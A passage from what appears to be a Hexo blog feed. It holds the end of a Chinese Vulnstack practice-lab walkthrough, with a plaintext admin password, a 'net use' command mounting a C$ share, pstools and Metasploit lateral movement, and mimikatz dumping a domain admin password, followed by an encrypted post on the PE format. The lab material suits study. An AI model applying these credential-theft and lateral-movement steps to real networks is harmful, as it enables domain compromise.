class="line-numbers language-text" data-language="text"><code class="language-text">administrator:123qwe!ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>挂载C盘</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net use Z: <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30<span class="token punctuation">\</span>c$ /user:administrator 123qwe<span class="token operator">!</span>ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/923db79b42190219ed5eaeaaa4807ee1_MD5.jpeg"></p><p>利用pstools远程连接到win7<br><img src="/Rxi134_FILE/43021cdda9beb03742dba4fc11c39e22_MD5.jpeg"></p><p>利用pstools远程连接到win2008，但是使用pstools是失败的，不知道为啥，使用msf成功了<br><img src="/Rxi134_FILE/b28d4365efa7d86fe1aa9559802139bf_MD5.jpeg"><br><img src="/Rxi134_FILE/e8747a6b72a98571d26cce60f992ee20_MD5.jpeg"></p><p><img src="/Rxi134_FILE/cd1a543929d7096b0f50fab14f6a4357_MD5.jpeg"></p><h2 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h2><p>win7：直接上传mimikatz，没抓到域用户<br><img src="/Rxi134_FILE/e9d18372c2df207195eab95b63d653fc_MD5.jpeg"></p><p>win2008：meterpreter自带kiwi模块，导入后抓取密码，得到域控<code>Administrator:zxcASDqw123!!</code><br><img src="/Rxi134_FILE/ef253f78bf8f604afc9a0a0e1ce7c93c_MD5.jpeg"></p><h2 id="登录域控"><a href="#登录域控" class="headerlink" title="登录域控"></a>登录域控</h2><p><img src="/Rxi134_FILE/e6307a2bba195460de3771908d80f6bf_MD5.jpeg"><br><img src="/Rxi134_FILE/350745b6490ea82aff33c210c8763305_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 进攻性渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8.Portable Executable Format 可移植可执行格式</title>
      <link href="/2024/10/05/8.Portable%20Executable%20Format%20%E5%8F%AF%E7%A7%BB%E6%A4%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%A0%BC%E5%BC%8F/"/>
      <url>/2024/10/05/8.Portable%20Executable%20Format%20%E5%8F%AF%E7%A7%BB%E6%A4%8D%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bebb4c0fa27697cde2a798209c98ab31704cfb523d25d4318813d4b0d09241f7">2239f6ef2369263b61ef594c41be1d81caaad9e00dfd39e2e6679848a71a75425b783f2084bbe71c207ed1c250fb2ed6cefc9a851b67880d7dd7f0b02318ccecec0a1f5749dc5908d23dee16a3508513fe37119411562cbbb5d634a272aff775828ae2dfe89e1e316934e7ebf7fdc7705484780dd502c931c2de673f0a3834570aa8fb5fdf6d7a6a1e7a1f4871297dceed207bc1b5be0faaec655726c17d0a6339cbe79c5c0f2c378c401cc331f7627724dd82655b850b59f57da79c6a31f3d901cc4d4f85b2e4dc834e1df2cff123135aacd48a841c20c8325b59615c5cbbd4ec50110cfdcb42929d28025a06eb5fb0eeea56eaabd68c635168cfb96fe1907ceec57e4aad7104424409646dfe6020d4fc6000b45d13e0699da94d5cf4122b7acaf66f6b190230247c8a4bc8e2fcffb1b5a26e47c7301fc95e80a3032639a71273fa45f4c1d30dd132e601cc2c1abbd0c4359c96df8c0d60aec660ba180763d65b73121d2fada70447fe6856e223deda54f98c064bc55571969572b01bd16e16b5f45b34316c7bed1e97930d7d6952380107f5fb7d25849b8cb21c1e7af92225126f99e658d95451ea1fdacc0b6a350ffd33693dc82267e7ea77e99a5fde7e5bb9221ed3f938321cbab351bb8469619a209e2df8621071b1022a1aedb5bc3692aff92a1126e5dca28df03d784e0abbd71411c98fa005b67dc325cb56dc089b1a037fbcddd04f40602001086c27d97b11cfd38b845317801e995dbc8bc855b7c5ee7a993c7b6696b9437630dc0644396efc14bb2fdd38471b6d0323dfd879dfeef8b5f484ab751ed49d57c1eb98f8bbebee80bf084a6d42bf4713f9797723b73a265567d2394ea57cd17a4352a90dab4c4598504308852bd12ebd72df18ce7bec026203fa1487c6459248489fa7893bd7b0f4a2b6ee68c39f51d9fc3a640ecb888f53fee0a47b3347074f320123bf11a86c597b575909aaa3527117a27710173e695919319a0ec008e2f23331f69ff5737d0de611332a06a513dcb8a79125a76773249444cd9a0d4d3b898c928f050ef28455b862d7af31076b408bbc4474ae736a663d0c2a0eaabb9e818111dc6895737623c0c0c460792734898f05844d41f0593b4b777204389ea87c6b40d78cd23f70437e45d6eea8e65f8927a955303dc82125f9c985e3b1ac049753bd27a7dd19de2ece036dd166ade2c90c071329ecc6d568fe3f14ff0eccc4dc0b4ee830c19d1d2d620b43b2d0a630db9d61d61460440cb17255b2e17fa38b2529de9a08b5ab36e5f86d77fdf02d995854641871a02bddc039cd5d6190a0527b6b9b68feef7ff3e13001dae02ce92822364ff6ab71226843d08b06dfaabad8f88b64bce74e07578adbc171355d5426fc4af0a0c3cd076c136b11c14ea390a7f6684b0e151dfb4a519d3d6e512c1441669d2a45066d690ec08c0072469d442cc599010ba7bc22e0a076540e58e783ea2ead8b247c04938c529350bc06f04dc10d9902f8057ea09d32daa795e569cf44f6ce0e78a7c2e9a505aae92ee854c49d0c4f8a12510ab84a37b338f3ec2d8c5cf39a8a404de8311bc72ff1e350b8aa80b1f22663575c09095d5aff08d57468204f79121b90d03af62dd8d7118f067ba8191b8be215c7ebef6f923cec28d39a657ff901f354086fb028b75da2e5290a3e036fa35f28667580e87f821fc30d64562bf7653014b8b0c214ff324fcb7e9250e319336c6f1441ea4d9a291a03fbe8e6e979664837b07f372ffa2cda0b3958841083b50c7181896eb2e0008730301eefbdf6e06a11d56bf2eeb00a2a2cc0f7f56ae265cf89317737c7b0d51b1dfaf8d3b2e2d4604adaaa94434ca3a7ee955e924de15effdcc85b5111d795800256012e6665b2186d413189a8835af224978963c5ea17f51a5c6bcbc26004b6924af5e4509d091c8cabd041a12950b8e7cec5a39760c9503fd0a6e04c093c6f44ffed3a64bee3ff6f82131ee6d92978b7aaaf5333aa580d764080fdd62a3cd30ab9111661a98ea619fc36a9c5b5c2b2103387302d7ba9ea951e9de057718548a4496364466880a169ffea9eabd61318f5b96b02967b23602cb60002c74e1a0288af3dd7a62c08ba3b2caac8eb570dc6103e348db2b07e4fdb2153aa1ed0b49228d0bbe8ec241f609b98625662ae852293f0cfc9e35f149c6d5b5b308793d778dd4455e744bf454c2256c075699fa51902f22778ca729e7d0882d60ef9b3d97114f15706c051f8beb2139251ce0712847305f65ba24b8a68203cef33fa1d7f2e846efeba553301ff5ee02f8c6fa613b8342bc17bda0e0c99ff8f816639e2a8298cde33c92ba970b4ea635d330406710b8e40af9b2538c1f051bfca8de91ddd062f1e10910439918b0eb6eb4b1d42ac1c5cf4ace4c05d8a201a95e18685dfb8e2c0fc17c6bf505915871cacd5bc7d83d17f40dc842da6429531df4ead22d05848260b0dd9b3a81488413a4a7e6ad0f178d25bdd02f427840f5b88b925e2c5016195b61839a10877e2628937ea586e32bd51439123fc6102e1f2adb12569b8b6a38342ab9a39ad0f451aaa8c3c1f021b2f6d76a803570cc33f3a0434daf9f8681b2dd2de093b331e7c70fb4cda50007d7c8800b5bcd9bed7f304a6db5e3c75f75c05d0a4009144cc0f1bad4880b30152947993590ef7d3e0309c21ecfde5a6b6199d8f22d4166b8df2c9a7e60fef6838a10a664ebae33c3439ee46a0a9563ad5f1bde231a040353f1288bf4070a25e5381f7b1f005a91fd590e8bcdfb5ea45728f636e900f0ee12586053c453fd70f7aa7a8252f890dd984476b2d69234daad2511fb9c143e6417dd7a441c0780392353d7c5841ae40cb0df68090809457b3cff4fac85f05197fc6d4888243374afdf0873a406663cff38b891fa550883ad9962ace98f17b0506e0719a69c88cf35e3e90e07381d044bfb93b7423c9b440e5ad54f5dbd33f15876a23bbc07a60672b3c3974459acd6370e2a20f250f54651310ad10face5541d0526e5ea00d0c7ac46fe62d112caba264c2e615d3a84ca8c1890d3d78b7edb1acbcbd00bf86ace69826701f96758bcb7876a0473caaddb8abdb11bd5e151327de656bf3f279d086ab13d8caa8d8c83b9609e6b7ff8f25425a164e95aa5d8255fbdcfd3eadacf0cb8be8c05b07780e23cf4fadb87ed34539fb66fd99c5ba261ccd8ee2e21bcd9dfeb1d64f4b938f120c67059d6755d813ff9827da17aa29162bfa1f056320e68b732dd29a25f878bb0e826c6a90fb999868d7abe9cc70a4df78a40787f2c3a2e57e0bc1023e9949a5e42fd478b10075147ac15002eb51b9562cc8b3419e0fe60abbd3fa7bdbc1dd119f5d9aae21774f408f37a4a921c026d497a0aefe46f1b9df48ba3cdc13ee8e494b4cf7efc32820c390d377202fa6f01deb18e45c9a1e5bf25a9c4b68472435836d09fbb6b8cfeebef18ba3aa186d1dbf94eae0e0843314cf8dcec5ffb0c73995cc5c09372f294ebf057963722ccc92969a421ab7af07feedd15ba3506d09685a2781ff0dff2c8167ac671867ee9de0060c1eb84c7282dba86e4814a4ee73cdfbc64a4c6664313df9e24c3bedb159bc59bbb6342ef16713c2711875aba69241dceaef04d908a987e5056d551113fa9fdbf520f72bcd55168079714f2dda9925d4bebdabcc3ac4a7985b4af089bc47a49683b056a48dfec70ddf572f9fe364dc81120a2450cb20299690f0565e4a048a4d5aac2e299cd6aff5222a38b3a03c541659b1f8bd6330df275ce9988de791aa322a8c115935154bf8d074149b1eac7eaa25bf64652238b8601a46a5a10358578ce7da6fecfb0c8fa4872694e097e212e7fb65cb1065edc1f8aa3e0438b57734ab7b0b0cdffcd109567a25b82ff38ebdf7d855850a9538b929eb57feef7e8ea70284cfe834fb2bf0293b8bd324e209d818cf47f134396daabac980b2d259deff39e073a3ff5ac2721fd6d47403d041c0890f129b374f68bdddb9110a224bb96475e6fe0137404dcb988a645048734cb7e6356ac205a74dc3c9ec926983a66b70de092fef1e203e466f74b51cb80be9c122d86dd48dc78c4c599489653dbaebad75ce7eb5815791821fce316b142826f14b5a786c93e45ec71018d78c63168e53180a7b3c07a68431e584787dc4277d07e1d6a83147098d44bf90cdf00e0e84d7618f1e8659354bfbe04e46df6724e2de6f5e05e722b2313c375d78705ba6abf723b3d76af99100ff9443929f2e0af99f21db9e69efd71f7ca07d718155fdecea79b4ab78a9b779fd5a6fd5b3861ec73eaa624b27c68a794cfb6d5170d6fb41b388325bcc0fa6db4aea4c76973401ba9e0263d7cc4553edadd14a726995a7b2fdd516a9bce5e39c09b2a448413c2e5ce216ded9ecda59b820602db7836c5fdcd1a329d88d3d91d8ab41be2555e6dfb226fad98cdc53a7626a192d42293c8ff0e98ba9adbf14483d46016ccfb3355ca3dbfeee44433b64dd743377ccf9708177e7ea86bee5229445f2bbc04f696c5acbf0e4d28c6d2752ac86cf829bec6f385e75e41468503bde49a86850e0af77294e9b1c0a746320fa4b6d7fb6994241733f419de569ae88584565fd09929aa5e2f70cc8126f21bb1cce873e0c787e60600f95530b2c07f15892dc88c64e8fa6b7537b36b79513ed81979f746bba0951de3419fc50f3a2b58ddf9a5895de49b7ac1112cca5361ea74d37f03c0330dba2b51a0df69840baa5333720d085b7e99a72e9d7810456651eff5e609205175b32ff572e244acf94ce55597b3b959168b0624ab6b0ff46051ae9edd87348f5070bac66dac29dbc657a4647fb62e792b948a4cb8b4c792f5b42568baa08ad5dd105e2ec0b98a889fdea4c48726d523aebe0aef4c6c85e70c9ac0af5ffbdea405d3d32214ae4e03ea574d86b6d132a5a7c4f23d9cd4360760bf98e0cf5d8302c7b101d006d9927be7a6c2f497c6fad8aaf72ebfebcd77c3ad5b5747430b76e29cd454a9c111b616763c693e95b6f1bc832847cf1d4e92a3037d6daf36e55e3eba56627ed6522c0532c9b249215cbde14c9512e519d40f972f9a180111c085a68b120e2996cd358e841b6fb047b94601e18eb38c63bde8ed9e9990ec61165ccfa81b157cb97da41870060329d0cab0e0475d69e60d52a8b393e7507e546f0e53d57ba8809c7a88b8e6ac7db5d2cda52694668fd7b168af510cb43737f7152cc1a51dea0a4830f14ff348e1b432f5cbe79d3f86580bd2bd62609758a7c64e58997ac3b15c372c5171ca10d579b628ac3603898a3d6a806ccee89bb4bc9c174de86363b4760e0ae1392514eccde79b8bcbbbf760a783ecc13f125128e51afbeb9be4ee69f424bd8779eaed180d9fa2d01b0943f76af61b9f4b38a357b3ad2c6eea8201b924832759e227eada2a5a0e45b1e79f9a21c936f8fb25a87f3bf97805895019ea03796f64a41348b3ff0eac921e588ac6da34f05db1189a695cb895cd58f451042326df51b417a4153e25d1f7de241077e8e6b7149d7f69362fd8f7d8618b9e4fb56055ea897b39a3056ef242f84631711dc5fc87b540e8ac0e152881197253755c799017bb027c184325f8162c827094623e8475463f3e033ea3c81ba9afe9dd27729d7fe54374e82a6f54b4d222d98bb0efb8528e58a146c0d12763c752af960c8eae0b43d14c74981b607f480428524508c5980617f98c8b60d16ad6237ba1d61b1e791af12a9a190f7f7ce6ebf25fdf1ea94cba57cb61142a917b4a90b2ef4197a9b1393042d0a7ebbc31d458e365885148f2f376a514ca48021b26119f6b0a02691b4635214450b0150ea8c25b43950bf66f51ec3a8d409525adab752d07e24e54222d9cc53a28c3e12bd938cc192e80957e5844c8556f12c6a3f40b4ae27ef156c20c58738975dbe99627fd04223fe699e148c2d141c5db604158ff7f6175620571229f2bd1d49558a2ddb979862bbc63f71f5254f4385b9e6650292fdc5682d7db8912a3af10af7652b3235301c0c8a6190af617fdc9089bc8440da1c5f89bc88ace391447bb3eea2480fe6421ac3a4fccdec8a55e77b20bd9847b23c0a197ef2eebb509c01c85c811c10c53212f5bd8610f69182758d46e0f7b151159bb52585c0d3b4141573c41cccf1958ca370f5a7e180c9d8e557896e4597e9f53991d99de5b4ff9dd51f6c1cb32e6170e9d19290a61244885065872da4da5090aa259f275c31646ec6623866c45bf2b6b70eb83b0b8e8f61c3295b2b33656b84835c7a576fa4fb095bb569130a3504786c09f0543fbdf477606b84124ba77970201991e7e24542f15ed24f3695dafa323493205dd2ea6a988e02caf093fff605d22a0f0850325e47616a1feecd13648807c7920b3c6e4f101f6c750c9400c81954e5aa8eef9f6ec38c3d11fb55665fb2aa78a7cc1aef4dc44b552f7b12bc4ef5499c1673b10c05eee512335ee84e7af287350d12551dc0cbe548861fa9ce32e81cf3032ae7a152d017249e959fadb29f676fa0b6608e8d5685b42b4badf60c9390e22b4165f76c43e92b56f56ae722748b46d52db82e4c24d112ad5eca20cf8f12d7736aa15e520bc59032f85e0cd12010dce4e6396f5ca73ae75a1c16be15b6bafdf25a561ce8a174bfebfeb85ebf3fa469b9fc96cbccd423e950af9659971ddaa4bc855c7338900bf35b29b0172144282f2c85538327826383162b28d2cc3f5a5242f4e35f9d7f4399c723bc34be20a33ca16a4ed9d7c24d74e23b774d42907faa587c18c31ab01759835b4f620dfbf2f3ff67ce609742bb684300cb16f832fd36a19f3e6c5cb8a74f9d672c38db5b39e7cfadf966210ac8d5ecf1585528282d93457b3125a844640d56ef40fb2d1e8719a45d00e04eeae0cbff9eb86d863b16f496a544a69fc4aa12f6edc911f903b7d8f2d2413fbf52524d6f52606338ce82e85b91cb92e47ded945f74d10ec32f3e58234b60295e6f38c680679e1b0c7713d8b7fac64140ef349e8cbe6f901ac9b242a5edb4fd847781315b95c1f1949a8061258895cd4b03dabaaadf1303ba763f3da2bd21778a41bbbc041b5b8d9e5b9f7cd1cb34a07ec669541b193bcd176511d31d179cdde750fcdb6c4e436380917c3c812c8143d1bbee762286545c4941df5dc6968b5b690a4b4f921bc845e3985e15979442ad1fbd83e28e61e2ed4b0370eca3f24462f848b7a43be6d75087989f4adfd90c42e738ca9ff3f52dd056c5e62581d4420ef6f2130248cc755e09bf273876812882693d506f6c46c813eb7277de667e6d34bc97c8d4e02988da1934bf85b29dd8132c556df34707d6204542925fecc1a0fec2df1db1fd94895699fd0e661383be4c9cd4703bb78f4a46dd2eef0f71288b1a2780249dc37fd9eecf6f4a3b8b7ab0a9deaf4301db8a90f2817ef064fa8d19510fd5955573ec8bf40201f6e84a8668181824e3bcde9a2d597c192133f03a27e3e3393138b7f70e6ef3b31dc93ff5723eac9c20abd020476e970d3d4acb2b4e30778f20d256d172ec938bc0306eb264e97e8ae7207b68e3eb763419e4c049c08c42e497bbb1d3652f3d107f58dca289e6232e9f4d2d6d44e0ba70d3bc4204f9a6ddbb1c2d521f2d1f020cefa41589ea47221437639a05fe6dbccc47140d2a86e46ebc896b3212f10c39fcc7150131909b35eea985465c4914495c3aed4077099b96c68928d920576f8d5e59ed54dda1ead7361ac6df697087183c3bb82c69ee2ad41da287b023d658fee4c243d67cb6175034b86485eb1dfcdb2e9799078a67e2328f2715a9439a3960c8b55c02c97a3eb00288f032036c663e858134a9dd0ad359cb606d13a8dadd850ef9f4f9346ec5bdda5f22168d97f087ae6594e174d0c57bd82f60df5f07d3c4a6a066233b152dd99d5948fef68204aa26470a7ba99585a533c565b1a83627ff4a94313a3da09a3ef3f65ebdbfb624f100af4d1f1fd1c219d28f72a3f35f0469b5821fbd1bd4804f7eeb9bb13e51cabbd458c08c904368f85376f339c6171ca57c67f924e2c9b6f2a1d1e8982d7a62dc70fc0b85f8bef4b44c40135cdb2756e1cdbbf586a393317345afc38477a0bb3927355565ffe7fe40a54ed89bdd87d271f5d071e8178985a4bb2de70f772fa19967e65dfcd3109d0ee4338c044a45ac7dc23c1febfb41ad9ab5b057c63e468e0a29bcb931fb32ee717eacb33d21a6f09714bdded8147a019015879d47095b03e2c35edcf326efd371c6493d6c97ce809db5b4bebf3ec2dbc955272323527379b04191838e7bd6ddb30b05b2b2bde9195671d05cc33d5a2e18dd010c3670ef92205043cba0195ef07431af399702b9a53706e0e10623948b1ba45303f9a56fb76fa0320802a9389a6cf20fac96be38abff1ff6b54f7a9041ed7a1095b95ad77a1e143dc265850e6947a55d9fd94d4e8717a1b86e6746ecf12c4d2680334cac419597d652cfec9255c695ffff50da8a83fd1995fd322ffbd06a342f5a3fe1f62686dfcda25eca4639d8221323016791db161f71b8470e193235f68acc952aea1c8d50d1ebd129b6d2b4750eb2f0d492aa6f2131ee16298f0c27e27478527fb1ecf8f188c0f6c4533bd290bdc5af6e0e0465c19ce20206da6be1c09956f82a5ac508213902554f18ca08a18759d0ca78246ca8b0c99ad100ded8ccccee720fb68d45cff89713206f259511aa7b7aa9e420ecdf74ad4057b92607fd8678cfd2e252234c4320af5a49550b95ef2de7bc49448b8df7169d0240870a9445d7a91dfacb372968c220277fb025e7307db4cf70388f12e2372d21b91bc2419bdfd4edfdab09dba07bd237a8e43589151958c56e91e9a3582cab3fde2320189123917473493098d5c523ddf3f9c531c4c95c7b5a5627e01c48d3855af439ae0e4096f96432127880a7ac8252870cab4a9a91c4f4707f39cfdc6a4b34a3f0e71b7dac2acec078d6daff6b8dfda10a2a6a5df8816634a4f3f93e37680bb06322db8aa5e18ab327b21951499eca87d7abb9311adfca86d8a9cd23498b4e6535c9c8ada67bee7743c6bf1fe76f2291885ddc922edf5102b88c8fd8f7974783674e5f80bad655344b0e7284d2c1c677332693b8b4519fef165dd369efe70f6f97454f2da446f0f21dc08ddb52bead53aac30f0d4f38a1e7c2273681ad3475c6487e3c40f9ac0b95dd8d8e5b62ce2a619dbb8e0d4c686bba092d9abf4c277b5bce17ffbbccaf1ba7f05dce9551e5bc38d322186dc32abda89e0bafae78d4d34ff8193e1cd89c206e64c344930f26bd433174493bc88c0864e3a1361695dd9c76803b981f87ccb7b4c40e0f1a93393268abb6029028621b45417be2c354b162976951b192346e6301dbf3b0bad1ac07f5575e6bc71eaf1f13334b1f78b7698479b50ddd05ae176147217f8990be414751dc0e2572e6f0398481c65b214eafa9cd831f7b59fe39fc37fa5f4fc489b7e83210ba90916eb388dd2306ff0cda88d3cca327c13395bb89ef24618f7023f754a1d9424a1ce166fe449317ee019248f67ab0b4f0c4d2795211299b6cca83467561d69d49fc2b8caf6eaf9acc195c710456fc0aee935b6fc41d8f1cbd4677d684c533d55e8907fd98758dc7538f7ac7416ee30797c7ac44cf8279490d217ef2106a2b3cd73572039d8f2916a5ba7cbd6a3acde4aa4c48116ffc0c4d1103f7cc5155fc3e2080a3dd34df921b447df88fb1cb30b96e7003d4104a2df45265aea6ef921fa878a30da2fdea9248410dfbdf7628911d3aa6decae932819a49acb0dc0a1d1db7d6c018de3032095979986dce5b46900ea94dffa93875cffb726ee19c650360f5989a3f69d94a2cec9783466d75ea2ebc60139477dd51687222da3e1c842df13018549f583076ba815c7a1fe012c29fe54170e90d6633f2d051808a00081eab3d1ccdf14a99bd1b0601ec8f8d000f4c20961785db4ccff59e78403c2e7250e2947fff4f55d243ebf74e3692635f2db669e385ddeb4efdae40dcbf88ac30c5b4a94641d7b67e90cf9a53050230827b6d845ae2f48b51546eed696ffe392d6c701ebae6236b60447d3b4aec1c6305d5f3a78699be0a72b34731ed110fddd29594719132a7c83b367983f3058b9c0b747c20d3ddf69f48029466a33ccc18fb312df40562ab31e1ff4f9c526f6f9d9dcfa1242154e2e846304ee19f949b791444d5909902e5af8ad382df354e6d8788bafe7323e22492174829673e39f1186843a5ca8ceffde07ce2b31f3cea853d17feb91f73f64d76f214c6988639f29f7d825196f2360a7e0d78f744915e8c1f62fa1c279604ec5292bb50c37a06d35b6255956b37f6f4f56b635fd203c0a49dcecaf4d8df2b35e7255fbe5140f7ae1aebe8b1ff06579f704ec42bc726cd83ffdf26a5037e7d9e208bdcac383d4202728463fa94dd5e2bd321ad83f79f6a020709420b390187efb38e1edc7d3737774b0b5da3240778e540436421d5c16ba581c73bf33c1d56ee9aa321f77350cb0013e8e5c975a3e14a92429112e5e7c05d4bd6fdaf439f6e4d0ce223b91bf6df8bdf1a7b680aaf4529345b17a2d8b8ee18a1b0ead132e61e90567290d91f99cc0a35d301edf536d23a3ca79ee6426d120d4bed26c21d6748949fdad1287b44d2687590a6577c7e1e9a88c3f1790fbfbd43005c3f7f91f7371ef4e416b60601a11377a9894ba3c01e48a258114573693fafece58873def76e6ca13ae23f5facbd82d41ee2e13704f1392b0cdfe5a30252b82d90dd96ff21de89f91804cff70de7016566a4d47d3a3244393123143edd9ba482ebdd45eea7670097baff8df11a3cf6761ac7b491312e22ea86af74ad6320b5d517c16e273fc630de68121a2c0a3f2ef0f3e3313218061254e2f166c18e77df158cbdee623e5221a555f141693f17a3c378547f072679077746082779bb683db98c679a9da9ef3d68928ce36d202109a7db62b462c3811f33e6caf3410e5f38ac37304c0aafdcbbaae34c87ca62a47dd9b29f0d607e2251e1a74239ef89af502e8fad5e1296ad78c0071f29f5dcd8a7be69088bd7745de4e4fe75489a8bd8989c263f1da2fd5466e53035b47ec5514ab7411ab79bdb9f316fec757ff4d139ec35f3ef69e5639ee1294aa49afae2cb773160632b3b20ec698312cb1883fe263e71b036a7f2e2bc01fad876cdd1801f21982fcff4601acad05f936364202f077086f9829ea550689c42060a689e27ed26818d518360d0ed03af7970e6f3869c0513a7c39b4e69238fe0e20e0830dc62405370288b6223f353c9e7ee21a92e0355506cd16c6942d8c6940f05530282dfc376bce47dbb8b4dfebb74a30a8545cd52b93f096a91e3f2bf9a8478728a58776536d3724c24e9f95f0bb6818fb8e0c5486b22314b5dc18a47ef04a4115cabb21ad126b57f0dc6febb9b3b8ba1384678940e9f3d7bcfe74941e58b8d914cd35da35c766b4868e562e1d643f51d0bcb94804f57bb82c7046fdb27c964e8454dc3dc570e21cf15b90d536fe6ca8d7e0cf74da90bcc1d2ba2d731110f7bbb4887c78d333adf89b1811774f3715660c01b086737b637baf30164cf4acef18ea92019d871dc79758af1b94a26242b3dc0a7d5670ec987b4bfdc4d260c82a896e194dd67775b6288b7b6f09ce68750db465d3f4683737860148b7b6c11ef8fea60042c3b1dd316c87d4240a497414fc3b077fd055b855916e301cad5159917f6d1513fa140ceaad652f4508df247df690915eaea3e0912a5bcd10b24e965a55818bb59f1167488619aa0f3e46fe75a218e560b1924196ce099b461cfcd20b043b5c228c1faa5dfc40e698253b6e4f0fddbf5ee184488b61d901ba1a9f76fac59d19ac4664ec2214b76beb3393173fdb0476d01522c69525fc38fa96bfe10d453732f4d2a8bd45cf8b20a85dc2fdc75433a30a4a964c4bc083334c2f6780ff57cb5f7aab10193f754cf77a558fcc6320e167da055f72552aedc6ef5301a3889e7424c63cf7749208a655ae04c18243c638239324d378e165c0df4b2c48e12144852c76586c85c5d0000a871c83ea78699cd83671c82daca77f89d9c86654e00b191114009b8911a8751bcf953b37071c01b3f8e766b52bfb7b8062abbe272c5a51c1279435d3447da13bb9db5b6ae42e5ce35bfb2b01024dab424c0e2a48bc0eefc4079b4772e6f9376259b7bb9a0fb2aa9c785a434bedffe29929aff0d1abef710b125b4f7253a06e5009ff49e930f5a5fba0e38ff86b4e0b01d25f8279a3422a2bb5b36c9d1cb543f1768e60477c1a0d50d1d0dc1312d70969653d2dde319dbc94184e1ed4945c14bb09fbba7d8fcf30906154851442019ec8f6a4a4b4ecdcbaea9cc5fbb0b6b8c626513dc76ac2160de5bc27292ef302fc242d48d01d53d642f568c7e90055843b3efb93fe9c3bcb6f96c311feec48f1da832ff826feebe911aa2d9b05d4d4662e66f3061205d4a9a548ef6ec5dd6357ac5d2aadad5ce22654c8cf8772de8ab005b83ef2b70a5697f2bfb8107475693169ad56526471fef4b6b51548bdf2282ce76092763c5ab489288a833477a69e0487c8e185f0352b4128973e20036777676b553b53d1f63873c8d0595b67cf177cf72191b18f68996f4db0ab59ac923168ebedb830030079f936d6b769ea7c60bda479d52ea1a980f754e343de15518303d5ca556951aad59a797f543517510bbedd83c78b031e92a7958d82981e13a8d8ee7c9445454b262791a1184c0fd69970014a5d419983abd7f8294b879601c52cfd6d221e7765c7a1c1389ea3e457a4791894560ae35fdc750b36db6ef9063433c5a2ef0aa74a3d56ad686a68a6231a425730bd6bd47fbdf41bbf16ed8b1289fd7e3531258ff338085d592393fba91e270b6b2cc93a25984b1a589097dae43adf5fc4b6e736960b1e6eb2326cd70911b079a895d7cc5d10b7ecb9ec5cc0bb264dec9b23dbeae37a6a83d52e56dbbf7d9fe19f7f7969bcdbb1bf82e6f6620d20f1d0b4c6f70635a3b4291c98e1d02b0ce1078f8dbbbdf3939eb32b36842eece703cd83642283c9affd35062a4f66deb37a6d00182edf3e47d65020d2c9acd44984906e09ff3fe163bd55c4901747d75b3fab521968befbea3927996eced149daf2fcbef1b195c2f3befeff331d692da0b60a01f7e5ee1e5cbf380d96d39669aee7cb7b6ac394d4b9452095adb50e6e209c4e73318956a13e97b94a097730cf8ae8b7aa15b1f3ade0678f1bb6a4b75a3a07f46f1ea37cb167e1563524b792ab388e53fff61524ee3248506558495de8a7446a962b7d0837f1258cb719efe83129e0749266a167123399fec19409a44d24e79d1bee4715fca7776840764610cc3d165e63f50ee6a65283e8cb6b02505abb4f032e8c4c845336b738edc0182a0bb2052fb4ded60aeb891971073c8c2d0b3dd0fd1d43d6b65963835d5ee24462a66c77aa537d4eda7e7cac50f58369479c95814e40d4e5f113889d884ccd9448dce6e5d502467c8fec2f0586e51078cf87a83c61cae7d66a2ffab834d51c224bb3560fc66d953b1661400d3ac6a26491ee2ab617c52a73ff382bcd23eba72ffffc4071af11c1371d9b34eea5b536d9b336c78b5db975fc49731dd83ba88bf966b5d0402d2299d25478ae8a540af254712f7b89f4aeb4f254f67c453e810a614938da13700bfd495cc003d10e1c89cc4feb67b7cb76a0604c058dca47cc203b28de06ae57c00b7121eed1dd1877a2bc16e9ed345b38af929e15abdb2ddba24e49161c9cf62a7650035fbf02d8284798a53e2bcf675327693fd3652aac40a38022125696fa5a6780f08f0c5ad2a124a770b6194c02bec9383e7876c7138a363d40c1dac33512e3b767662812614a5dcf9bdb3bab668fccd917f80c99b640a47e7fa69307db4a6ec1d8b7e134857b27a6a9ed26f01b8eecae60061d6c9256a96628925592e10b13a5d1d688c92275ba4344af0e2538466a377aec57f011f0034270cf27272f232280f6708bd8f7cf0178ee5c9c5dd986fc3414cb406c61ac3e939bbfebe72f04cff79f78091c1bbfedbfcf1226ac6c72e816a0ad0db60b774bea750dd50c08ad33c2efe0c0eba58bfe4781a33e4f0ad5a5fb530c206aa30df21eac11729a46983d588c25b0d6c8b3527c7736cadc515902e3d1fbf7c7219fe93abd17077028adaf89b135c9a28331f44926331ca194aa4faf1aea0b065f5550266ba9760fb423bca1ab6ee6283639289e6893bc6a94b3132b9e0ef00f46380f3d0e29bf8dcbc527739a38bf9d4d27943636a7e284188d926e1b27a4b02544c3f9b60331acf121f89a663685d3402cbfdcace364aab75c5f161efb714b20d11620c9335dcd9148c3ca1c1ec0c0c78a655e847e2aca3f6d03119bb445abdd7611fa5195c5c539a5d65f1736aa04e8d572b4efc28eb6199eafff9e2d04d6f5e692d210645efa52cf8131bddfe894ca7e52b3d8cd22824dcc81899ee491aa8daf185dfeb30b3a71749c8f99e2ba13e8cf66b89cca1b01a4a1445a58d6ffe5a70fb50ba1ee58031815aeb7ad57186aa92d5a36719454f8311304339cb15947e8f55d2ccd7fb27ca6f68103f2883542b9d721c04607e20392984ad5f88b3c8aee97e9099d2541a8ebb54cf4bf21a371ed48077a6fc0faf9c515070a9ed0a11779aa02324188fa5cdc9f239ba29137b200584c127a8b679d846a6654896b1191aa99804cfee6ecf0d18229cbab08cc8b4c004706f74f774c7b390764f09b49eb09e67084cfd3d8db8f992716b0a694f6f7206dea9a5f9ee2112c309f28cad69fbe5dbbd97b6e8a0648417b326a64c16ceab2666d